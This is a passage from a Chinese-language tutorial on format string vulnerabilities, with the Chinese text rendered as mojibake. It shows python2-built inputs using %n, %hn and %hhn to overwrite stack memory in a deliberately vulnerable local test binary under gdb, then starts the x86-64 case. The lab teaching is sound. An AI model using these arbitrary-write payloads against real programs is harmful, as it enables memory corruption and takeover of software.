ä¸ªå‚æ•°ï¼Œå³å†™å…¥ <code>0xffffd538</code> çš„åœ°æ–¹ï¼ˆ<code>0xffffd564</code>ï¼‰ï¼Œ<code>printf()</code> å°±æ˜¯é€šè¿‡è¿™ä¸ªåœ°å€æ‰¾åˆ°è¢«è¦†ç›–çš„å†…å®¹çš„ï¼š</p>
<pre><code class="language-text">$ python2 -c 'print(&quot;\x38\xd5\xff\xff%08x%08x%012d%13$n&quot;)' &gt; text
$ gdb -q a.out
Reading symbols from a.out...(no debugging symbols found)...done.
gdb-peda$ b printf  
Breakpoint 1 at 0x8048350
gdb-peda$ r &lt; text  
[----------------------------------registers-----------------------------------]
EAX: 0xffffd564 --&gt; 0xffffd538 --&gt; 0x88888888
EBX: 0x804a000 --&gt; 0x8049f14 --&gt; 0x1
ECX: 0x1
EDX: 0xf7f9883c --&gt; 0x0
ESI: 0xf7f96e68 --&gt; 0x1bad90
EDI: 0x0
EBP: 0xffffd5f8 --&gt; 0x0
ESP: 0xffffd52c --&gt; 0x8048520 (&lt;main+138&gt;:      add    esp,0x20)
EIP: 0xf7e27c20 (&lt;printf&gt;:      call   0xf7f06d17 &lt;__x86.get_pc_thunk.ax&gt;)
EFLAGS: 0x292 (carry parity ADJUST zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0xf7e27c1b &lt;fprintf+27&gt;:     ret
   0xf7e27c1c:  xchg   ax,ax
   0xf7e27c1e:  xchg   ax,ax
=&gt; 0xf7e27c20 &lt;printf&gt;: call   0xf7f06d17 &lt;__x86.get_pc_thunk.ax&gt;
   0xf7e27c25 &lt;printf+5&gt;:       add    eax,0x16f243
   0xf7e27c2a &lt;printf+10&gt;:      sub    esp,0xc
   0xf7e27c2d &lt;printf+13&gt;:      mov    eax,DWORD PTR [eax+0x124]
   0xf7e27c33 &lt;printf+19&gt;:      lea    edx,[esp+0x14]
No argument
[------------------------------------stack-------------------------------------]
0000| 0xffffd52c --&gt; 0x8048520 (&lt;main+138&gt;:     add    esp,0x20)
0004| 0xffffd530 --&gt; 0xffffd564 --&gt; 0xffffd538 --&gt; 0x88888888
0008| 0xffffd534 --&gt; 0x1
0012| 0xffffd538 --&gt; 0x88888888
0016| 0xffffd53c --&gt; 0xffffffff
0020| 0xffffd540 --&gt; 0xffffd55a (&quot;ABCD&quot;)
0024| 0xffffd544 --&gt; 0xffffd564 --&gt; 0xffffd538 --&gt; 0x88888888
0028| 0xffffd548 --&gt; 0x80481fc --&gt; 0x38 ('8')
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, 0xf7e27c20 in printf () from /usr/lib32/libc.so.6
gdb-peda$ x/20x $esp
0xffffd52c:     0x08048520      0xffffd564      0x00000001      0x88888888
0xffffd53c:     0xffffffff      0xffffd55a      0xffffd564      0x080481fc
0xffffd54c:     0x080484b0      0xf7ffda54      0x00000001      0x424135d0
0xffffd55c:     0x00004443      0x00000000      0xffffd538      0x78383025
0xffffd56c:     0x78383025      0x32313025      0x33312564      0x00006e24
gdb-peda$ finish
Run till exit from #0  0xf7e27c20 in printf () from /usr/lib32/libc.so.6
[----------------------------------registers-----------------------------------]
EAX: 0x20 (' ')
EBX: 0x804a000 --&gt; 0x8049f14 --&gt; 0x1
ECX: 0x0
EDX: 0xf7f98830 --&gt; 0x0
ESI: 0xf7f96e68 --&gt; 0x1bad90
EDI: 0x0
EBP: 0xffffd5f8 --&gt; 0x0
ESP: 0xffffd530 --&gt; 0xffffd564 --&gt; 0xffffd538 --&gt; 0x20 (' ')
EIP: 0x8048520 (&lt;main+138&gt;:     add    esp,0x20)
EFLAGS: 0x282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x8048514 &lt;main+126&gt;:        lea    eax,[ebp-0x94]
   0x804851a &lt;main+132&gt;:        push   eax
   0x804851b &lt;main+133&gt;:        call   0x8048350 &lt;printf@plt&gt;
=&gt; 0x8048520 &lt;main+138&gt;:        add    esp,0x20
   0x8048523 &lt;main+141&gt;:        sub    esp,0xc
   0x8048526 &lt;main+144&gt;:        push   0xa
   0x8048528 &lt;main+146&gt;:        call   0x8048370 &lt;putchar@plt&gt;
   0x804852d &lt;main+151&gt;:        add    esp,0x10
[------------------------------------stack-------------------------------------]
0000| 0xffffd530 --&gt; 0xffffd564 --&gt; 0xffffd538 --&gt; 0x20 (' ')
0004| 0xffffd534 --&gt; 0x1
0008| 0xffffd538 --&gt; 0x20 (' ')
0012| 0xffffd53c --&gt; 0xffffffff
0016| 0xffffd540 --&gt; 0xffffd55a (&quot;ABCD&quot;)
0020| 0xffffd544 --&gt; 0xffffd564 --&gt; 0xffffd538 --&gt; 0x20 (' ')
0024| 0xffffd548 --&gt; 0x80481fc --&gt; 0x38 ('8')
0028| 0xffffd54c --&gt; 0x80484b0 (&lt;main+26&gt;:      add    ebx,0x1b50)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x08048520 in main ()
gdb-peda$ x/20x $esp
0xffffd530:     0xffffd564      0x00000001      0x00000020      0xffffffff
0xffffd540:     0xffffd55a      0xffffd564      0x080481fc      0x080484b0
0xffffd550:     0xf7ffda54      0x00000001      0x424135d0      0x00004443
0xffffd560:     0x00000000      0xffffd538      0x78383025      0x78383025
0xffffd570:     0x32313025      0x33312564      0x00006e24      0xf7e70240
</code></pre>
<p>å¯¹æ¯” <code>printf()</code> å‡½æ•°æ‰§è¡Œå‰åŽçš„è¾“å‡ºï¼Œ<code>printf</code> é¦–å…ˆè§£æž <code>%13$n</code> æ‰¾åˆ°èŽ·å¾—åœ°å€ <code>0xffffd564</code> çš„å€¼ <code>0xffffd538</code>ï¼Œç„¶åŽè·³è½¬åˆ°åœ°å€ <code>0xffffd538</code>ï¼Œå°†å®ƒçš„å€¼ <code>0x88888888</code> è¦†ç›–ä¸º <code>0x00000020</code>ï¼Œå°±å¾—åˆ° <code>arg2=0x00000020</code>ã€‚</p>
<h3 id="_12">è¦†ç›–ä»»æ„åœ°å€å†…å­˜</h3>
<p>ä¹Ÿè®¸å·²ç»æœ‰äººå‘çŽ°äº†ä¸€ä¸ªé—®é¢˜ï¼Œä½¿ç”¨ä¸Šé¢è¦†ç›–å†…å­˜çš„æ–¹æ³•ï¼Œå€¼æœ€å°åªèƒ½æ˜¯ 4ï¼Œå› ä¸ºå•å•åœ°å€å°±å åŽ»äº† 4 ä¸ªå­—èŠ‚ã€‚é‚£ä¹ˆæˆ‘ä»¬æ€Žæ ·è¦†ç›–æ¯” 4 å°çš„å€¼å‘¢ã€‚åˆ©ç”¨æ•´æ•°æº¢å‡ºæ˜¯ä¸€ä¸ªæ–¹æ³•ï¼Œä½†æ˜¯åœ¨å®žè·µä¸­è¿™æ ·åšåŸºæœ¬éƒ½ä¸ä¼šæˆåŠŸã€‚å†æƒ³ä¸€ä¸‹ï¼Œå‰é¢çš„è¾“å…¥ä¸­ï¼Œåœ°å€éƒ½ä½äºŽæ ¼å¼å­—ç¬¦ä¸²ä¹‹å‰ï¼Œè¿™æ ·åšçœŸçš„æœ‰å¿…è¦å—ï¼Œèƒ½å¦å°†åœ°å€æ”¾åœ¨ä¸­é—´ã€‚æˆ‘ä»¬æ¥è¯•ä¸€ä¸‹ï¼Œä½¿ç”¨æ ¼å¼å­—ç¬¦ä¸² <code>"AA%15$nA"+"\x38\xd5\xff\xff"</code>ï¼Œå¼€å¤´çš„ <code>AA</code> å ä¸¤ä¸ªå­—èŠ‚ï¼Œå³å°†åœ°å€èµ‹å€¼ä¸º <code>2</code>ï¼Œä¸­é—´æ˜¯ <code>%15$n</code> å  5 ä¸ªå­—èŠ‚ï¼Œè¿™é‡Œä¸æ˜¯ <code>%13$n</code>ï¼Œå› ä¸ºåœ°å€è¢«æˆ‘ä»¬æ”¾åœ¨äº†åŽé¢ï¼Œåœ¨æ ¼å¼å­—ç¬¦ä¸²çš„ç¬¬ 15 ä¸ªå‚æ•°ï¼ŒåŽé¢è·Ÿä¸Šä¸€ä¸ª <code>A</code> å ç”¨ä¸€ä¸ªå­—èŠ‚ã€‚äºŽæ˜¯å‰åŠéƒ¨åˆ†æ€»å…±å ç”¨äº† 2+5+1=8 ä¸ªå­—èŠ‚ï¼Œåˆšå¥½æ˜¯ä¸¤ä¸ªå‚æ•°çš„å®½åº¦ï¼Œè¿™é‡Œçš„ 8 å­—èŠ‚å¯¹é½ååˆ†é‡è¦ã€‚æœ€åŽå†è¾“å…¥æˆ‘ä»¬è¦è¦†ç›–çš„åœ°å€ <code>\x38\xd5\xff\xff</code>ï¼Œè¯¦ç»†è¾“å‡ºå¦‚ä¸‹ï¼š</p>
<pre><code class="language-text">$ python2 -c 'print(&quot;AA%15$nA&quot;+&quot;\x38\xd5\xff\xff&quot;)' &gt; text
$ gdb -q a.out
Reading symbols from a.out...(no debugging symbols found)...done.
gdb-peda$ b printf  
Breakpoint 1 at 0x8048350
gdb-peda$ r &lt; text  
[----------------------------------registers-----------------------------------]
EAX: 0xffffd564 (&quot;AA%15$nA8\325\377\377&quot;)
EBX: 0x804a000 --&gt; 0x8049f14 --&gt; 0x1
ECX: 0x1
EDX: 0xf7f9883c --&gt; 0x0
ESI: 0xf7f96e68 --&gt; 0x1bad90
EDI: 0x0
EBP: 0xffffd5f8 --&gt; 0x0
ESP: 0xffffd52c --&gt; 0x8048520 (&lt;main+138&gt;:      add    esp,0x20)
EIP: 0xf7e27c20 (&lt;printf&gt;:      call   0xf7f06d17 &lt;__x86.get_pc_thunk.ax&gt;)
EFLAGS: 0x292 (carry parity ADJUST zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0xf7e27c1b &lt;fprintf+27&gt;:     ret
   0xf7e27c1c:  xchg   ax,ax
   0xf7e27c1e:  xchg   ax,ax
=&gt; 0xf7e27c20 &lt;printf&gt;: call   0xf7f06d17 &lt;__x86.get_pc_thunk.ax&gt;
   0xf7e27c25 &lt;printf+5&gt;:       add    eax,0x16f243
   0xf7e27c2a &lt;printf+10&gt;:      sub    esp,0xc
   0xf7e27c2d &lt;printf+13&gt;:      mov    eax,DWORD PTR [eax+0x124]
   0xf7e27c33 &lt;printf+19&gt;:      lea    edx,[esp+0x14]
No argument
[------------------------------------stack-------------------------------------]
0000| 0xffffd52c --&gt; 0x8048520 (&lt;main+138&gt;:     add    esp,0x20)
0004| 0xffffd530 --&gt; 0xffffd564 (&quot;AA%15$nA8\325\377\377&quot;)
0008| 0xffffd534 --&gt; 0x1
0012| 0xffffd538 --&gt; 0x88888888
0016| 0xffffd53c --&gt; 0xffffffff
0020| 0xffffd540 --&gt; 0xffffd55a (&quot;ABCD&quot;)
0024| 0xffffd544 --&gt; 0xffffd564 (&quot;AA%15$nA8\325\377\377&quot;)
0028| 0xffffd548 --&gt; 0x80481fc --&gt; 0x38 ('8')
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, 0xf7e27c20 in printf () from /usr/lib32/libc.so.6
gdb-peda$ x/20x $esp
0xffffd52c:     0x08048520      0xffffd564      0x00000001      0x88888888
0xffffd53c:     0xffffffff      0xffffd55a      0xffffd564      0x080481fc
0xffffd54c:     0x080484b0      0xf7ffda54      0x00000001      0x424135d0
0xffffd55c:     0x00004443      0x00000000      0x31254141      0x416e2435
0xffffd56c:     0xffffd538      0xffffd500      0x00000001      0x000000c2
gdb-peda$ finish
Run till exit from #0  0xf7e27c20 in printf () from /usr/lib32/libc.so.6
[----------------------------------registers-----------------------------------]
EAX: 0x7
EBX: 0x804a000 --&gt; 0x8049f14 --&gt; 0x1
ECX: 0x0
EDX: 0xf7f98830 --&gt; 0x0
ESI: 0xf7f96e68 --&gt; 0x1bad90
EDI: 0x0
EBP: 0xffffd5f8 --&gt; 0x0
ESP: 0xffffd530 --&gt; 0xffffd564 (&quot;AA%15$nA8\325\377\377&quot;)
EIP: 0x8048520 (&lt;main+138&gt;:     add    esp,0x20)
EFLAGS: 0x282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x8048514 &lt;main+126&gt;:        lea    eax,[ebp-0x94]
   0x804851a &lt;main+132&gt;:        push   eax
   0x804851b &lt;main+133&gt;:        call   0x8048350 &lt;printf@plt&gt;
=&gt; 0x8048520 &lt;main+138&gt;:        add    esp,0x20
   0x8048523 &lt;main+141&gt;:        sub    esp,0xc
   0x8048526 &lt;main+144&gt;:        push   0xa
   0x8048528 &lt;main+146&gt;:        call   0x8048370 &lt;putchar@plt&gt;
   0x804852d &lt;main+151&gt;:        add    esp,0x10
[------------------------------------stack-------------------------------------]
0000| 0xffffd530 --&gt; 0xffffd564 (&quot;AA%15$nA8\325\377\377&quot;)
0004| 0xffffd534 --&gt; 0x1
0008| 0xffffd538 --&gt; 0x2
0012| 0xffffd53c --&gt; 0xffffffff
0016| 0xffffd540 --&gt; 0xffffd55a (&quot;ABCD&quot;)
0020| 0xffffd544 --&gt; 0xffffd564 (&quot;AA%15$nA8\325\377\377&quot;)
0024| 0xffffd548 --&gt; 0x80481fc --&gt; 0x38 ('8')
0028| 0xffffd54c --&gt; 0x80484b0 (&lt;main+26&gt;:      add    ebx,0x1b50)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x08048520 in main ()
gdb-peda$ x/20x $esp
0xffffd530:     0xffffd564      0x00000001      0x00000002      0xffffffff
0xffffd540:     0xffffd55a      0xffffd564      0x080481fc      0x080484b0
0xffffd550:     0xf7ffda54      0x00000001      0x424135d0      0x00004443
0xffffd560:     0x00000000      0x31254141      0x416e2435      0xffffd538
0xffffd570:     0xffffd500      0x00000001      0x000000c2      0xf7e70240
</code></pre>
<p>å¯¹æ¯” <code>printf()</code> å‡½æ•°æ‰§è¡Œå‰åŽçš„è¾“å‡ºï¼Œå¯ä»¥çœ‹åˆ°æˆ‘ä»¬æˆåŠŸåœ°ç»™ <code>arg2</code> èµ‹å€¼äº† <code>0x00000002</code>ã€‚</p>
<p>è¯´å®Œäº†æ•°å­—å°äºŽ 4 æ—¶çš„è¦†ç›–ï¼ŒæŽ¥ä¸‹æ¥è¯´è¯´å¤§æ•°å­—çš„è¦†ç›–ã€‚å‰é¢çš„æ–¹æ³•æ•™æˆ‘ä»¬ç›´æŽ¥è¾“å…¥ä¸€ä¸ªåœ°å€çš„åè¿›åˆ¶å°±å¯ä»¥è¿›è¡Œèµ‹å€¼ï¼Œå¯æ˜¯ï¼Œè¿™æ ·å ç”¨çš„å†…å­˜ç©ºé—´å¤ªå¤§ï¼Œå¾€å¾€ä¼šè¦†ç›–æŽ‰å…¶ä»–é‡è¦çš„åœ°å€è€Œäº§ç”Ÿé”™è¯¯ã€‚å…¶å®žæˆ‘ä»¬å¯ä»¥é€šè¿‡é•¿åº¦ä¿®é¥°ç¬¦æ¥æ›´æ”¹å†™å…¥çš„å€¼çš„å¤§å°ï¼š</p>
<pre><code class="language-c">char c;
short s;
int i;
long l;
long long ll;

printf(&quot;%s %hhn\n&quot;, str, &amp;c);       // å†™å…¥å•å­—èŠ‚
printf(&quot;%s %hn\n&quot;, str, &amp;s);        // å†™å…¥åŒå­—èŠ‚
printf(&quot;%s %n\n&quot;, str, &amp;i);         // å†™å…¥4å­—èŠ‚
printf(&quot;%s %ln\n&quot;, str, &amp;l);        // å†™å…¥8å­—èŠ‚
printf(&quot;%s %lln\n&quot;, str, &amp;ll);      // å†™å…¥16å­—èŠ‚
</code></pre>
<p>è¯•ä¸€ä¸‹ï¼š</p>
<pre><code class="language-text">$ python2 -c 'print(&quot;A%15$hhn&quot;+&quot;\x38\xd5\xff\xff&quot;)' &gt; text
0xffffd530:     0xffffd564      0x00000001      0x88888801      0xffffffff

$ python2 -c 'print(&quot;A%15$hnA&quot;+&quot;\x38\xd5\xff\xff&quot;)' &gt; text
0xffffd530:     0xffffd564      0x00000001      0x88880001      0xffffffff

$ python2 -c 'print(&quot;A%15$nAA&quot;+&quot;\x38\xd5\xff\xff&quot;)' &gt; text
0xffffd530:     0xffffd564      0x00000001      0x00000001      0xffffffff
</code></pre>
<p>äºŽæ˜¯ï¼Œæˆ‘ä»¬å°±å¯ä»¥é€å­—èŠ‚åœ°è¦†ç›–ï¼Œä»Žè€Œå¤§å¤§èŠ‚çœäº†å†…å­˜ç©ºé—´ã€‚è¿™é‡Œæˆ‘ä»¬å°è¯•å†™å…¥ <code>0x12345678</code> åˆ°åœ°å€ <code>0xffffd538</code>ï¼Œé¦–å…ˆä½¿ç”¨ <code>AAAABBBBCCCCDDDD</code> ä½œä¸ºè¾“å…¥ï¼š</p>
<pre><code class="language-text">gdb-peda$ r
AAAABBBBCCCCDDDD
[----------------------------------registers-----------------------------------]
EAX: 0xffffd564 (&quot;AAAABBBBCCCCDDDD&quot;)
EBX: 0x804a000 --&gt; 0x8049f14 --&gt; 0x1
ECX: 0x1
EDX: 0xf7f9883c --&gt; 0x0
ESI: 0xf7f96e68 --&gt; 0x1bad90
EDI: 0x0
EBP: 0xffffd5f8 --&gt; 0x0
ESP: 0xffffd52c --&gt; 0x8048520 (&lt;main+138&gt;:      add    esp,0x20)
EIP: 0xf7e27c20 (&lt;printf&gt;:      call   0xf7f06d17 &lt;__x86.get_pc_thunk.ax&gt;)
EFLAGS: 0x292 (carry parity ADJUST zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0xf7e27c1b &lt;fprintf+27&gt;:     ret
   0xf7e27c1c:  xchg   ax,ax
   0xf7e27c1e:  xchg   ax,ax
=&gt; 0xf7e27c20 &lt;printf&gt;: call   0xf7f06d17 &lt;__x86.get_pc_thunk.ax&gt;
   0xf7e27c25 &lt;printf+5&gt;:       add    eax,0x16f243
   0xf7e27c2a &lt;printf+10&gt;:      sub    esp,0xc
   0xf7e27c2d &lt;printf+13&gt;:      mov    eax,DWORD PTR [eax+0x124]
   0xf7e27c33 &lt;printf+19&gt;:      lea    edx,[esp+0x14]
No argument
[------------------------------------stack-------------------------------------]
0000| 0xffffd52c --&gt; 0x8048520 (&lt;main+138&gt;:     add    esp,0x20)
0004| 0xffffd530 --&gt; 0xffffd564 (&quot;AAAABBBBCCCCDDDD&quot;)
0008| 0xffffd534 --&gt; 0x1
0012| 0xffffd538 --&gt; 0x88888888
0016| 0xffffd53c --&gt; 0xffffffff
0020| 0xffffd540 --&gt; 0xffffd55a (&quot;ABCD&quot;)
0024| 0xffffd544 --&gt; 0xffffd564 (&quot;AAAABBBBCCCCDDDD&quot;)
0028| 0xffffd548 --&gt; 0x80481fc --&gt; 0x38 ('8')
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, 0xf7e27c20 in printf () from /usr/lib32/libc.so.6
gdb-peda$ x/20x $esp
0xffffd52c:     0x08048520      0xffffd564      0x00000001      0x88888888
0xffffd53c:     0xffffffff      0xffffd55a      0xffffd564      0x080481fc
0xffffd54c:     0x080484b0      0xf7ffda54      0x00000001      0x424135d0
0xffffd55c:     0x00004443      0x00000000      0x41414141      0x42424242
0xffffd56c:     0x43434343      0x44444444      0x00000000      0x000000c2
gdb-peda$ x/4wb 0xffffd538
0xffffd538:     0x88    0x88    0x88    0x88
</code></pre>
<p>ç”±äºŽæˆ‘ä»¬æƒ³è¦é€å­—èŠ‚è¦†ç›–ï¼Œå°±éœ€è¦ 4 ä¸ªç”¨äºŽè·³è½¬çš„åœ°å€ï¼Œ4 ä¸ªå†™å…¥åœ°å€å’Œ 4 ä¸ªå€¼ï¼Œå¯¹åº”å…³ç³»å¦‚ä¸‹ï¼ˆå°ç«¯åºï¼‰ï¼š</p>
<pre><code class="language-text">0xffffd564 -&gt; 0x41414141 (0xffffd538) -&gt; \x78
0xffffd568 -&gt; 0x42424242 (0xffffd539) -&gt; \x56
0xffffd56c -&gt; 0x43434343 (0xffffd53a) -&gt; \x34
0xffffd570 -&gt; 0x44444444 (0xffffd53b) -&gt; \x12
</code></pre>
<p>æŠŠ <code>AAAA</code>ã€<code>BBBB</code>ã€<code>CCCC</code>ã€<code>DDDD</code> å æ®çš„åœ°å€åˆ†åˆ«æ›¿æ¢æˆæ‹¬å·ä¸­çš„å€¼ï¼Œå†é€‚å½“ä½¿ç”¨å¡«å……å­—èŠ‚ä½¿ 8 å­—èŠ‚å¯¹é½å°±å¯ä»¥äº†ã€‚æž„é€ è¾“å…¥å¦‚ä¸‹ï¼š</p>
<pre><code class="language-text">$ python2 -c 'print(&quot;\x38\xd5\xff\xff&quot;+&quot;\x39\xd5\xff\xff&quot;+&quot;\x3a\xd5\xff\xff&quot;+&quot;\x3b\xd5\xff\xff&quot;+&quot;%104c%13$hhn&quot;+&quot;%222c%14$hhn&quot;+&quot;%222c%15$hhn&quot;+&quot;%222c%16$hhn&quot;)' &gt; text
</code></pre>
<p>å…¶ä¸­å‰å››ä¸ªéƒ¨åˆ†æ˜¯ 4 ä¸ªå†™å…¥åœ°å€ï¼Œå  4*4=16 å­—èŠ‚ï¼ŒåŽé¢å››ä¸ªéƒ¨åˆ†åˆ†åˆ«ç”¨äºŽå†™å…¥åå…­è¿›åˆ¶æ•°ï¼Œç”±äºŽä½¿ç”¨äº† <code>hh</code>ï¼Œæ‰€ä»¥åªä¼šä¿ç•™ä¸€ä¸ªå­—èŠ‚ <code>0x78</code>ï¼ˆ16+104=120 -&gt; 0x78ï¼‰ã€<code>0x56</code>ï¼ˆ120+222=342 -&gt; 0x0156 -&gt; 0x56ï¼‰ã€<code>0x34</code>ï¼ˆ342+222=564 -&gt; 0x0234 -&gt; 0x34ï¼‰ã€<code>0x12</code>ï¼ˆ564+222=786 -&gt; 0x312 -&gt; 0x12ï¼‰ã€‚æ‰§è¡Œç»“æžœå¦‚ä¸‹ï¼š</p>
<pre><code class="language-text">$ gdb -q a.out
Reading symbols from a.out...(no debugging symbols found)...done.
gdb-peda$ b printf  
Breakpoint 1 at 0x8048350
gdb-peda$ r &lt; text  
Starting program: /home/firmy/Desktop/RE4B/a.out &lt; text
[----------------------------------registers-----------------------------------]
EAX: 0xffffd564 --&gt; 0xffffd538 --&gt; 0x88888888
EBX: 0x804a000 --&gt; 0x8049f14 --&gt; 0x1
ECX: 0x1
EDX: 0xf7f9883c --&gt; 0x0
ESI: 0xf7f96e68 --&gt; 0x1bad90
EDI: 0x0
EBP: 0xffffd5f8 --&gt; 0x0
ESP: 0xffffd52c --&gt; 0x8048520 (&lt;main+138&gt;:      add    esp,0x20)
EIP: 0xf7e27c20 (&lt;printf&gt;:      call   0xf7f06d17 &lt;__x86.get_pc_thunk.ax&gt;)
EFLAGS: 0x292 (carry parity ADJUST zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0xf7e27c1b &lt;fprintf+27&gt;:     ret
   0xf7e27c1c:  xchg   ax,ax
   0xf7e27c1e:  xchg   ax,ax
=&gt; 0xf7e27c20 &lt;printf&gt;: call   0xf7f06d17 &lt;__x86.get_pc_thunk.ax&gt;
   0xf7e27c25 &lt;printf+5&gt;:       add    eax,0x16f243
   0xf7e27c2a &lt;printf+10&gt;:      sub    esp,0xc
   0xf7e27c2d &lt;printf+13&gt;:      mov    eax,DWORD PTR [eax+0x124]
   0xf7e27c33 &lt;printf+19&gt;:      lea    edx,[esp+0x14]
No argument
[------------------------------------stack-------------------------------------]
0000| 0xffffd52c --&gt; 0x8048520 (&lt;main+138&gt;:     add    esp,0x20)
0004| 0xffffd530 --&gt; 0xffffd564 --&gt; 0xffffd538 --&gt; 0x88888888
0008| 0xffffd534 --&gt; 0x1
0012| 0xffffd538 --&gt; 0x88888888
0016| 0xffffd53c --&gt; 0xffffffff
0020| 0xffffd540 --&gt; 0xffffd55a (&quot;ABCD&quot;)
0024| 0xffffd544 --&gt; 0xffffd564 --&gt; 0xffffd538 --&gt; 0x88888888
0028| 0xffffd548 --&gt; 0x80481fc --&gt; 0x38 ('8')
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, 0xf7e27c20 in printf () from /usr/lib32/libc.so.6
gdb-peda$ x/20x $esp  
0xffffd52c:     0x08048520      0xffffd564      0x00000001      0x88888888
0xffffd53c:     0xffffffff      0xffffd55a      0xffffd564      0x080481fc
0xffffd54c:     0x080484b0      0xf7ffda54      0x00000001      0x424135d0
0xffffd55c:     0x00004443      0x00000000      0xffffd538      0xffffd539
0xffffd56c:     0xffffd53a      0xffffd53b      0x34303125      0x33312563
gdb-peda$ finish
Run till exit from #0  0xf7e27c20 in printf () from /usr/lib32/libc.so.6
[----------------------------------registers-----------------------------------]
EAX: 0x312
EBX: 0x804a000 --&gt; 0x8049f14 --&gt; 0x1
ECX: 0x0
EDX: 0xf7f98830 --&gt; 0x0
ESI: 0xf7f96e68 --&gt; 0x1bad90
EDI: 0x0
EBP: 0xffffd5f8 --&gt; 0x0
ESP: 0xffffd530 --&gt; 0xffffd564 --&gt; 0xffffd538 --&gt; 0x12345678
EIP: 0x8048520 (&lt;main+138&gt;:     add    esp,0x20)
EFLAGS: 0x282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x8048514 &lt;main+126&gt;:        lea    eax,[ebp-0x94]
   0x804851a &lt;main+132&gt;:        push   eax
   0x804851b &lt;main+133&gt;:        call   0x8048350 &lt;printf@plt&gt;
=&gt; 0x8048520 &lt;main+138&gt;:        add    esp,0x20
   0x8048523 &lt;main+141&gt;:        sub    esp,0xc
   0x8048526 &lt;main+144&gt;:        push   0xa
   0x8048528 &lt;main+146&gt;:        call   0x8048370 &lt;putchar@plt&gt;
   0x804852d &lt;main+151&gt;:        add    esp,0x10
[------------------------------------stack-------------------------------------]
0000| 0xffffd530 --&gt; 0xffffd564 --&gt; 0xffffd538 --&gt; 0x12345678
0004| 0xffffd534 --&gt; 0x1
0008| 0xffffd538 --&gt; 0x12345678
0012| 0xffffd53c --&gt; 0xffffffff
0016| 0xffffd540 --&gt; 0xffffd55a (&quot;ABCD&quot;)
0020| 0xffffd544 --&gt; 0xffffd564 --&gt; 0xffffd538 --&gt; 0x12345678
0024| 0xffffd548 --&gt; 0x80481fc --&gt; 0x38 ('8')
0028| 0xffffd54c --&gt; 0x80484b0 (&lt;main+26&gt;:      add    ebx,0x1b50)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x08048520 in main ()
gdb-peda$ x/20x $esp
0xffffd530:     0xffffd564      0x00000001      0x12345678      0xffffffff
0xffffd540:     0xffffd55a      0xffffd564      0x080481fc      0x080484b0
0xffffd550:     0xf7ffda54      0x00000001      0x424135d0      0x00004443
0xffffd560:     0x00000000      0xffffd538      0xffffd539      0xffffd53a
0xffffd570:     0xffffd53b      0x34303125      0x33312563      0x6e686824
</code></pre>
<p>æœ€åŽè¿˜å¾—å¼ºè°ƒä¸¤ç‚¹ï¼š</p>
<ul>
<li>é¦–å…ˆæ˜¯éœ€è¦å…³é—­æ•´ä¸ªç³»ç»Ÿçš„ ASLR ä¿æŠ¤ï¼Œè¿™å¯ä»¥ä¿è¯æ ˆåœ¨ gdb çŽ¯å¢ƒä¸­å’Œç›´æŽ¥è¿è¡Œä¸­éƒ½ä¿æŒä¸å˜ï¼Œä½†è¿™ä¸¤ä¸ªæ ˆåœ°å€ä¸ä¸€å®šç›¸åŒ</li>
<li>å…¶æ¬¡å› ä¸ºåœ¨ gdb è°ƒè¯•çŽ¯å¢ƒä¸­çš„æ ˆåœ°å€å’Œç›´æŽ¥è¿è¡Œç¨‹åºæ˜¯ä¸ä¸€æ ·çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦ç»“åˆæ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´žè¯»å–å†…å­˜ï¼Œå…ˆæ³„éœ²ä¸€ä¸ªåœ°å€å‡ºæ¥ï¼Œç„¶åŽæ ¹æ®æ³„éœ²å‡ºæ¥çš„åœ°å€è®¡ç®—å®žé™…åœ°å€</li>
</ul>
<h2 id="x86-64">x86-64 ä¸­çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ž</h2>
<p>åœ¨ x64 ä½“ç³»ä¸­ï¼Œå¤šæ•°è°ƒç”¨æƒ¯ä¾‹éƒ½æ˜¯é€šè¿‡å¯„å­˜å™¨ä¼ é€’å‚æ•°ã€‚åœ¨ Linux ä¸Šï¼Œå‰å…­ä¸ªå‚æ•°é€šè¿‡ <code>RDI</code>ã€<code>RSI</code>ã€<code>RDX</code>ã€<code>RCX</code>ã€<code>R8</code> å’Œ <code>R9</code> ä¼ é€’ï¼›è€Œåœ¨ Windows ä¸­ï¼Œå‰å››ä¸ªå‚æ•°é€šè¿‡ <code>RCX</code>ã€<code>RDX</code>ã€<code>R8</code> å’Œ <code>R9</code> æ¥ä¼ é€’ã€‚</p>
<p>è¿˜æ˜¯ä¸Šé¢çš„ç¨‹åºï¼Œä½†æ˜¯è¿™æ¬¡æˆ‘ä»¬æŠŠå®ƒç¼–è¯‘æˆ 64 ä½ï¼š</p>
<pre><code class="language-text">$ gcc -fno-stack-protector -no-pie fmt.c
</code></pre>
<p>ä½¿ç”¨ <code>AAAAAAAA%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.</code> ä½œä¸ºè¾“å…¥ï¼š</p>
<pre><code class="language-text">gdb-peda$ n
[----------------------------------registers-----------------------------------]
RAX: 0x0
RBX: 0x0
RCX: 0xffffffff
RDX: 0x88888888
RSI: 0x1
RDI: 0x7fffffffe3d0 (&quot;AAAAAAAA%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.&quot;)
RBP: 0x7fffffffe460 --&gt; 0x400660 (&lt;__libc_csu_init&gt;:    push   r15)
RSP: 0x7fffffffe3c0 --&gt; 0x4241000000000000 ('')
